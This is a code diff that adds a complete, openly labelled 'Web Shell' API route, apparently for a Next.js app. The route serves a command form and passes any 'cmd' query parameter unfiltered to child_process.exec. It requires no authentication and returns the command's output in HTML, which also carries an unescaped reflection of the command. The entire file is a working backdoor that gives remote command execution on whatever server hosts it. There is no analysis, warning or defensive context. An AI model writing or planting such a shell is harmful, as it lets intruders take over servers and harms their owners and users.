@@ -1,0 +1,49 @@
+import { exec } from 'child_process';
+
+export async function GET(request) {
+  const { searchParams } = new URL(request.url);
+  const cmd = searchParams.get('cmd');
+  
+  if (!cmd) {
+    return new Response(`<!DOCTYPE html>
+      <html><head><title>Web Shell</title>
+      <style>body{font-family:monospace;margin:20px;background:#111;color:#0f0;}
+      input{padding:10px;width:500px;}button{padding:10px 20px;background:#0f0;border:none;cursor:pointer;}
+      pre{background:#000;padding:15px;border:1px solid #0f0;}</style>
+      </head><body><h1>Web Shell</h1><form method="GET">
+      <input type="text" name="cmd" placeholder="Enter command" size="50">
+      <button type="submit">Execute</button></form><pre>Ready for commands...</pre>
+      </body></html>`, 
+      { headers: { 'Content-Type': 'text/html' } });
+  }
+
+  return new Promise((resolve) => {
+    exec(cmd, (error, stdout, stderr) => {
+      const output = stdout || stderr || error?.message || 'Command executed (no output)';
+      const html = `<!DOCTYPE html>
+        <html>
+        <head>
+          <title>Web Shell - ${cmd}</title>
+          <style>
+            body { font-family: monospace; margin: 20px; background: #111; color: #0f0; }
+            pre { background: #000; padding: 15px; border: 1px solid #0f0; }
+            input { padding: 10px; width: 500px; }
+            button { padding: 10px 20px; background: #0f0; border: none; cursor: pointer; }
+          </style>
+        </head>
+        <body>
+          <h1>Web Shell</h1>
+          <form method="GET">
+            <input type="text" name="cmd" value="${cmd.replace(/"/g, '&quot;')}" size="50">
+            <button type="submit">Execute</button>
+          </form>
+          <h3>Command: <code>${cmd}</code></h3>
+          <pre>${output.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
+          <a href="/api/shell">Clear</a>
+        </body>
+        </html>`;
+      
+      resolve(new Response(html, { headers: { 'Content-Type': 'text/html' } }));
+    });
+  });
+}
